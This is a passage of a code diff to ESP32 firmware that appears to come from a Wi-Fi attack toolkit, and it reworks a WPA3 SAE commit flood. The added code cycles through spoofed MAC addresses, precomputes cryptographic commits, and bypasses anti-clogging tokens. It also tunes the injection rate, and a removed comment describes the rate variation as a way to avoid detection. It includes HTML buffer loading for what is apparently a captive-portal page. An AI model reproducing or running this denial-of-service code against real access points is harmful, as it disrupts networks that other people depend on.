-        memcpy(spoofed_mac, base_mac, 6);
-        spoofed_mac[4] = (frame_counter >> 8) & 0xFF;
-        spoofed_mac[5] = frame_counter & 0xFF;
+        if ((frame_counter % 100) == 0) {
+            ESP_LOGI("SAE_LOOP", "alive fc=%d sent=%d", frame_counter, sae_flood_packets_sent);
+        }
+        // Select spoofed MAC, pin to token MAC if anti-clogging token is active
+        if (sae_token_mac_valid) {
+            memcpy(spoofed_mac, sae_token_mac, 6);
+        } else if (sae_mac_pool_ready) {
+            int pool_idx = (frame_counter / (sae_frames_per_mac > 0 ? sae_frames_per_mac : 1)) % SAE_MAC_POOL_SIZE;
+            memcpy(spoofed_mac, sae_mac_pool[pool_idx], 6);
+        } else {
+            // Fallback to legacy derivation if pool not ready
+            memcpy(spoofed_mac, base_mac, 6);
+            spoofed_mac[4] = (frame_counter >> 8) & 0xFF;
+            spoofed_mac[5] = frame_counter & 0xFF;
+            // Ensure locally administered, unicast
+            spoofed_mac[0] |= 0x02;
+            spoofed_mac[0] &= 0xFE;
+        }
         
         // Inject SAE commit frame
-        inject_sae_commit_frame(spoofed_mac, frame_counter);
+        esp_err_t tx_res = inject_sae_commit_frame(spoofed_mac, frame_counter);
+        if (tx_res == ESP_ERR_NO_MEM) {
+            consecutive_no_mem++;
+            success_streak = 0;
+            backoff_ms = (backoff_ms == 0) ? 50 : (backoff_ms * 2);
+            if (backoff_ms > 1000) backoff_ms = 1000;
+            if (rate_scale_pct > 10) {
+                rate_scale_pct -= 20;
+                if (rate_scale_pct < 10) rate_scale_pct = 10;
+            }
+            ESP_LOGW("SAE_FLOOD", "ESP_ERR_NO_MEM, backing off %d ms (streak=%d)", backoff_ms, consecutive_no_mem);
+            vTaskDelay(pdMS_TO_TICKS(backoff_ms));
+        } else if (tx_res != ESP_OK) {
+            // brief pause on other errors to avoid tight loop
+            vTaskDelay(pdMS_TO_TICKS(20));
+        } else {
+            if (backoff_ms > 0) backoff_ms /= 2;
+            if (consecutive_no_mem) consecutive_no_mem = 0;
+            if (++success_streak >= 10) {
+                success_streak = 0;
+                if (rate_scale_pct < 100) {
+                    rate_scale_pct += 10;
+                    if (rate_scale_pct > 100) rate_scale_pct = 100;
+                }
+            }
+        }
         
         frame_counter = (frame_counter + 1) % 65536;
         
-        // Rate limiting with variation to avoid detection
-        int variation = (esp_random() % 20) - 10; // +/- 10% variation
-        int actual_rate = sae_injection_rate + (sae_injection_rate * variation / 100);
-        if (actual_rate < 50) actual_rate = 50; // minimum rate
-        if (actual_rate > 200) actual_rate = 200; // reduced maximum rate
+        // Rate limiting with variation and adaptive scaling
+        int base_rate = (sae_injection_rate * rate_scale_pct) / 100;
+        int variation = (esp_random() % 20) - 10; // +/- 10%
+        int actual_rate = base_rate + (base_rate * variation / 100);
+        if (actual_rate < 1) actual_rate = 1;
+        if (actual_rate > 200) actual_rate = 200;
         
         // Ensure minimum delay to prevent watchdog timeout
         int delay_ms = 1000 / actual_rate;
-        if (delay_ms < 5) delay_ms = 5; // minimum 5ms delay
+    if (delay_ms < 2) delay_ms = 2; // harder push
+        if (backoff_ms > delay_ms) delay_ms = backoff_ms;
         vTaskDelay(pdMS_TO_TICKS(delay_ms));
         
         // Yield to other tasks every 10 frames
@@ -3923,8 +5582,7 @@ static void sae_flood_task(void *param) {
         }
     }
     
-    printf("SAE flood task stopped. Total frames sent: %d\n", sae_flood_packets_sent);
-    TERMINAL_VIEW_ADD_TEXT("SAE flood task stopped. Total frames sent: %d\n", sae_flood_packets_sent);
+    printf("SAE flood stopped. Sent: %d\n", sae_flood_packets_sent);
     sae_flood_task_handle = NULL;
     vTaskDelete(NULL);
 }
@@ -3937,10 +5595,13 @@ static void sae_flood_display_task(void *param) {
         int current_rate = frames_in_period / 5;
         last_count = sae_flood_packets_sent;
         
-        printf("SAE Flood: %d frames/sec | Total: %d frames\n", 
-               current_rate, sae_flood_packets_sent);
-        TERMINAL_VIEW_ADD_TEXT("SAE Flood: %d frames/sec | Total: %d frames\n", 
-                              current_rate, sae_flood_packets_sent);
+        // Use simpler output to reduce stack usage
+        printf("SAE: %d/sec | %d total | hits:%u miss:%u pwefail:%u tok:%u txok:%u txerr:%u s76:%u s0:%u\n",
+               current_rate, sae_flood_packets_sent,
+               (unsigned)sae_cache_hits, (unsigned)sae_cache_misses,
+               (unsigned)sae_pwe_failures, (unsigned)sae_token_rx,
+               (unsigned)sae_commit_tx_ok, (unsigned)sae_commit_tx_err,
+               (unsigned)sae_status76_rx, (unsigned)sae_status0_rx);
         
         vTaskDelay(pdMS_TO_TICKS(5000));
     }
@@ -3949,7 +5610,23 @@ static void sae_flood_display_task(void *param) {
     vTaskDelete(NULL);
 }
 
-void wifi_manager_start_sae_flood(void) {
+static void sanitize_password_input(const char *in, char *out, size_t out_size) {
+    if (!out || out_size == 0) return;
+    if (!in) { out[0] = '\0'; return; }
+    while (*in && isspace((unsigned char)*in)) in++;
+    const char *end = in + strlen(in);
+    while (end > in && isspace((unsigned char)end[-1])) end--;
+    if (end > in + 1 && (in[0] == '"' || in[0] == '\'')) {
+        char q = in[0];
+        if (end[-1] == q) { in++; end--; }
+    }
+    size_t n = (size_t)(end - in);
+    if (n >= out_size) n = out_size - 1;
+    if (n > 0) memcpy(out, in, n);
+    out[n] = '\0';
+}
+
+void wifi_manager_start_sae_flood(const char *password) {
 #if !defined(CONFIG_IDF_TARGET_ESP32C5) && !defined(CONFIG_IDF_TARGET_ESP32C6)
     printf("SAE flood attack only supported on ESP32-C5 and ESP32-C6\n");
     TERMINAL_VIEW_ADD_TEXT("SAE flood attack only supported on ESP32-C5 and ESP32-C6\n");
@@ -3988,15 +5665,90 @@ void wifi_manager_start_sae_flood(void) {
 
     memcpy(sae_target_bssid, selected_ap.bssid, 6);
     sae_target_channel = selected_ap.primary;
-    sae_injection_rate = 100;
+    sae_injection_rate = 60;
     sae_flood_packets_sent = 0;
     sae_flood_running = true;
+    sae_initialized = false;
+    sanitize_password_input(password, sae_flood_password_buf, sizeof(sae_flood_password_buf));
+    portENTER_CRITICAL(&sae_lock);
+    sae_ctx.token_required = false;
+    sae_ctx.token_len = 0;
+    portEXIT_CRITICAL(&sae_lock);
 
-    wifi_manager_start_monitor_mode(NULL);
+    // Build a small pool of spoofed MACs to preserve randomness without exhausting heap
+    {
+        uint8_t base_mac_build[6];
+        esp_wifi_get_mac(WIFI_IF_STA, base_mac_build);
+        for (int i = 0; i < SAE_MAC_POOL_SIZE; ++i) {
+            uint32_t r = esp_random();
+            memcpy(sae_mac_pool[i], base_mac_build, 6);
+            // locally administered, unicast
+            sae_mac_pool[i][0] |= 0x02;
+            sae_mac_pool[i][0] &= 0xFE;
+            sae_mac_pool[i][4] = (r >> 8) & 0xFF;
+            sae_mac_pool[i][5] = r & 0xFF;
+            sae_seq_counters[i] = (uint16_t)(esp_random() & 0x0FFF);
+            sae_precompute_attempted[i] = false;
+            sae_commit_cache_ready[i] = false;
+        }
+        sae_mac_pool_ready = true;
+    }
+
+    // Precompute commit (element + scalar) per MAC to avoid per-frame allocations
+    memset(sae_commit_cache_ready, 0, sizeof(sae_commit_cache_ready));
+    const char *pwd = sae_flood_password_buf[0] ? sae_flood_password_buf : NULL;
+    const char *ssid = (selected_ap.ssid[0] != '\0') ? (char*)selected_ap.ssid : NULL;
+    if (pwd && strlen(pwd) > 0) {
+        if (!sae_crypto_initialized) {
+            mbedtls_entropy_init(&sae_entropy);
+            mbedtls_ctr_drbg_init(&sae_ctr_drbg);
+            mbedtls_ecp_point_init(&sae_tmp_point);
+            mbedtls_ctr_drbg_seed(&sae_ctr_drbg, mbedtls_entropy_func, &sae_entropy, NULL, 0);
+            sae_crypto_initialized = true;
+        }
+        if (!sae_initialized) {
+            mbedtls_ecp_group_init(&sae_ctx.group);
+            mbedtls_ecp_point_init(&sae_ctx.pwe);
+            mbedtls_ecp_point_init(&sae_ctx.own_element);
+            mbedtls_ecp_point_init(&sae_ctx.peer_element);
+            mbedtls_mpi_init(&sae_ctx.own_scalar);
+            mbedtls_mpi_init(&sae_ctx.peer_scalar);
+            mbedtls_mpi_init(&sae_ctx.rand);
+            mbedtls_mpi_init(&sae_ctx.mask);
+            if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) {
+                // Skip precompute on error
+            } else {
+                int precomputed = 0;
+                for (int i = 0; i < SAE_MAC_POOL_SIZE && precomputed < SAE_PRECOMPUTE_LIMIT; ++i) {
+                    if (sae_precompute_attempted[i]) continue;
+                    sae_precompute_attempted[i] = true;
+                if (sae_derive_pwe(pwd, sae_mac_pool[i], sae_target_bssid, ssid, &sae_ctx.pwe, &sae_ctx.group) == ESP_OK) {
+                        if (sae_generate_commit(&sae_ctx) == ESP_OK) {
+                            uint8_t element_buf[33];
+                            size_t elen = 0;
+                            if (mbedtls_ecp_point_write_binary(&sae_ctx.group, &sae_ctx.own_element,
+                                                               MBEDTLS_ECP_PF_COMPRESSED, &elen,
+                                                               element_buf, sizeof(element_buf)) == 0 && elen == 33) {
+                                memcpy(sae_commit_element_cache[i], element_buf, 33);
+                                mbedtls_mpi_write_binary(&sae_ctx.own_scalar, sae_commit_scalar_cache[i], 32);
+                                sae_commit_cache_ready[i] = true;
+                                precomputed++;
+                            }
+                        }
+                    } else {
+                        sae_pwe_failures++;
+                    }
+                }
+            }
+            sae_initialized = true;
+        }
+    }
+
+    wifi_manager_start_monitor_mode(sae_monitor_callback);
     esp_wifi_set_channel(sae_target_channel, WIFI_SECOND_CHAN_NONE);
 
-    xTaskCreate(sae_flood_task, "sae_flood_task", 4096, NULL, 5, &sae_flood_task_handle);
-    xTaskCreate(sae_flood_display_task, "sae_flood_display", 2048, NULL, 3, &sae_flood_display_task_handle);
+    xTaskCreate(sae_flood_task, "sae_flood_task", 3072, NULL, 5, &sae_flood_task_handle);
+    xTaskCreate(sae_flood_display_task, "sae_displ", 2048, NULL, 3, &sae_flood_display_task_handle);
 
     char bssid_str[18];
     snprintf(bssid_str, sizeof(bssid_str), "%02x:%02x:%02x:%02x:%02x:%02x",
@@ -4027,8 +5779,79 @@ void wifi_manager_stop_sae_flood(void) {
     }
     
     wifi_manager_stop_monitor_mode();
+    if (sae_initialized) {
+        mbedtls_ecp_group_free(&sae_ctx.group);
+        mbedtls_ecp_point_free(&sae_ctx.pwe);
+        mbedtls_ecp_point_free(&sae_ctx.peer_element);
+        mbedtls_ecp_point_free(&sae_ctx.own_element);
+        mbedtls_mpi_free(&sae_ctx.peer_scalar);
+        mbedtls_mpi_free(&sae_ctx.own_scalar);
+        mbedtls_mpi_free(&sae_ctx.rand);
+        mbedtls_mpi_free(&sae_ctx.mask);
+        memset(&sae_ctx, 0, sizeof(sae_ctx));
+        sae_initialized = false;
+    }
+    if (sae_crypto_initialized) {
+        mbedtls_ecp_point_free(&sae_tmp_point);
+        mbedtls_ctr_drbg_free(&sae_ctr_drbg);
+        mbedtls_entropy_free(&sae_entropy);
+        sae_crypto_initialized = false;
+    }
+    memset(sae_commit_cache_ready, 0, sizeof(sae_commit_cache_ready));
+    sae_mac_pool_ready = false;
     printf("SAE flood attack stopped. Total frames sent: %d\n", sae_flood_packets_sent);
     TERMINAL_VIEW_ADD_TEXT("SAE flood attack stopped. Total frames sent: %d\n", sae_flood_packets_sent);
+}
+
+void wifi_manager_set_html_from_uart(void) {
+    use_html_buffer = true;
+    if (html_buffer == NULL) {
+        html_buffer = (char*)malloc(MAX_HTML_BUFFER_SIZE);
+        if (html_buffer == NULL) {
+            printf("Failed to allocate HTML buffer\n");
+            use_html_buffer = false;
+            return;
+        }
+    }
+    html_buffer_size = 0;
+    printf("HTML buffer mode enabled, ready to receive HTML content\n");
+}
+
+void wifi_manager_store_html_chunk(const char* data, size_t len, bool is_final) {
+    if (!use_html_buffer || html_buffer == NULL) {
+        return;
+    }
+    
+    if (html_buffer_size + len >= MAX_HTML_BUFFER_SIZE) {
+        printf("HTML buffer overflow, truncating content\n");
+        len = MAX_HTML_BUFFER_SIZE - html_buffer_size - 1;
+    }
+    
+    if (len > 0) {
+        memcpy(html_buffer + html_buffer_size, data, len);
+        html_buffer_size += len;
+    }
+    
+    if (is_final) {
+        html_buffer[html_buffer_size] = '\0';
+        printf("HTML content stored in buffer (%zu bytes)\n", html_buffer_size);
+        ESP_LOGI(TAG, "HTML capture completed: buffer=%p, size=%zu, use_html_buffer=%s", 
+                 html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
+    }
+}
+
+void wifi_manager_clear_html_buffer(void) {
+    ESP_LOGI(TAG, "Clearing HTML buffer - current state: buffer=%p, size=%zu, use_html_buffer=%s", 
+             html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
+    
+    use_html_buffer = false;
+    if (html_buffer != NULL) {
+        free(html_buffer);
+        html_buffer = NULL;
+    }
+    html_buffer_size = 0;
+    printf("HTML buffer cleared and disabled\n");
+    ESP_LOGI(TAG, "HTML buffer cleared successfully");
 }
 
 void wifi_manager_sae_flood_help(void) {
@@ -4043,3 +5866,106 @@ void wifi_manager_sae_flood_help(void) {
     printf("Commands: saeflood, stopsaeflood, saefloodhelp\n");
     TERMINAL_VIEW_ADD_TEXT("Commands: saeflood, stopsaeflood, saefloodhelp\n");
 }
+
+
+
+/**
+ * SAE monitoring callback to handle commit/confirm responses and anti-clogging tokens
+ */
+static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT) return;
+    
+    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
+    wifi_ieee80211_mac_hdr_t hdr_copy;
+    memcpy(&hdr_copy, &ipkt->hdr, sizeof(wifi_ieee80211_mac_hdr_t));  // Copy to avoid unaligned pointer
+    const wifi_ieee80211_mac_hdr_t *hdr = &hdr_copy;
+    
+    // Check if it's an authentication frame from our target AP
+    if ((hdr->frame_ctrl & 0xFC) != 0xB0) return;  // Not auth frame
+    if (memcmp(hdr->addr2, sae_target_bssid, 6) != 0) return;  // Not from target AP
+    
+    const uint8_t *auth_body = ipkt->payload;
+    uint16_t auth_alg = auth_body[0] | (auth_body[1] << 8);
+    uint16_t auth_seq = auth_body[2] | (auth_body[3] << 8);
+    uint16_t status_code = auth_body[4] | (auth_body[5] << 8);
+    
+    if (auth_alg != 3) return;  // Not SAE
+    
+    if (auth_seq == 1) {  // SAE Commit response
+        if (status_code == 76) {  // Anti-clogging token required
+            ESP_LOGI("SAE_RX", "status 76 token required");
+            uint16_t group_id = auth_body[6] | (auth_body[7] << 8);
+            // payload length is total mgmt payload minus 24 byte MAC header
+            size_t payload_len = (pkt->rx_ctrl.sig_len > 24) ? (size_t)pkt->rx_ctrl.sig_len - 24 : 0;
+            // Authentication body starts at payload+24
+            const uint8_t *auth_payload = (const uint8_t*)ipkt; // ipkt->payload already points past header in struct
+            const uint8_t *ptr = auth_body + 8;
+            size_t remaining = (payload_len > 8) ? (payload_len - 8) : 0;
+            uint16_t tlen = 0;
+            if (group_id == 19 && remaining >= 2) {
+                // For our simplified format, treat everything after group as token up to our cap
+                tlen = (remaining > sizeof(sae_ctx.token)) ? sizeof(sae_ctx.token) : (uint16_t)remaining;
+            }
+            portENTER_CRITICAL(&sae_lock);
+            sae_ctx.token_required = (tlen > 0);
+            sae_ctx.token_len = tlen;
+            if (tlen) memcpy(sae_ctx.token, ptr, tlen);
+            portEXIT_CRITICAL(&sae_lock);
+            memcpy(sae_token_mac, hdr->addr1, 6);
+            sae_token_mac_valid = true;
+            sae_token_rx++;
+            sae_status76_rx++;
+        } else if (status_code == 0) {  // Success - extract peer commit
+            ESP_LOGI("SAE_RX", "status 0 commit accepted");
+            // Extract peer scalar and element from response
+            uint16_t group_id = auth_body[6] | (auth_body[7] << 8);
+            if (group_id == 19) {  // P-256
+                // Peer scalar (32 bytes) + element (32 bytes)
+                mbedtls_mpi_read_binary(&sae_ctx.peer_scalar, auth_body + 8, 32);
+                uint8_t peer_element_buf[33] = {0x02};  // Compressed format
+                memcpy(peer_element_buf + 1, auth_body + 40, 32);
+                mbedtls_ecp_point_read_binary(&sae_ctx.group, &sae_ctx.peer_element, 
+                                              peer_element_buf, 33);
+                // Match scalar and element to the MAC AP responded to; set full tuple
+                if (sae_mac_pool_ready) {
+                    for (int i = 0; i < SAE_MAC_POOL_SIZE; ++i) {
+                        if (sae_commit_cache_ready[i] && memcmp(hdr->addr1, sae_mac_pool[i], 6) == 0) {
+                            portENTER_CRITICAL(&sae_lock);
+                            memcpy(sae_ctx.own_mac, sae_mac_pool[i], 6);
+                            memcpy(sae_ctx.peer_mac, sae_target_bssid, 6);
+                            memcpy(sae_ctx.bssid, sae_target_bssid, 6);
+                            mbedtls_mpi_read_binary(&sae_ctx.own_scalar, sae_commit_scalar_cache[i], 32);
+                            portEXIT_CRITICAL(&sae_lock);
+                            ESP_LOGI("SAE_RX", "matched pool idx=%d", i);
+                            break;
+                        }
+                    }
+                }
+
+                // Ensure PWE is derived for this MAC tuple for confirm/KCK
+                const char *pwd = settings_get_sta_password(&G_Settings);
+                const char *ssid = (selected_ap.ssid[0] != '\0') ? (char*)selected_ap.ssid : NULL;
+                if (pwd && strlen(pwd) > 0) {
+                    ESP_LOGI("SAE_RX", "derive pwe for confirm path");
+                    sae_derive_pwe(pwd, sae_ctx.own_mac, sae_target_bssid, ssid, &sae_ctx.pwe, &sae_ctx.group);
+                }
+                
+                // do not send confirm; continue flooding commits only
+                sae_status0_rx++;
+                // Clear token state after a successful exchange
+                portENTER_CRITICAL(&sae_lock);
+                sae_ctx.token_required = false;
+                sae_ctx.token_len = 0;
+                portEXIT_CRITICAL(&sae_lock);
+                sae_token_mac_valid = false;
+            }
+        }
+    } else if (auth_seq == 2) {  // SAE Confirm response
+        ESP_LOGI("SAE_RX", "confirm status=%u", (unsigned)status_code);
+    }
+}
+/**
+ * Inject SAE confirm frame after successful commit exchange
+ */
+// confirm injection removed – flood commits only
